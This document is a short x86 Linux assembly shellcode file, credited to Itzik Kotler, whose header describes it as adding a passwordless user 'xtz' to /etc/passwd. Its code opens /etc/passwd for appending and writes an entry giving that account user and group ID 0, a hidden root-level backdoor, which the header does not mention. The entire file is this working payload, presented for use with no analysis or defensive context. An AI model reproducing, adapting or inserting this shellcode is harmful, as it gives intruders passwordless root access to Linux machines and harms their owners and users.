#
# (linux/x86) adds user 'xtz' without password to /etc/passwd - 59 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		push $0x5

	_exit:

		popl %eax
		cdq
		xorl %ecx, %ecx
		movw $0x401, %cx
		pushl %edx
		pushl $0x64777373
		pushl $0x61702f63
		pushl $0x74652f2f
		movl %esp, %ebx
		int $0x80

		pushl $0x0a3a3a3a
		pushl $0x303a303a
		pushl $0x3a7a7478
		movl %eax, %ebx
		movb $0x4, %al
		movl %esp, %ecx
		movb $0xc, %dl
		int $0x80

		push $0x1
		jmp _exit

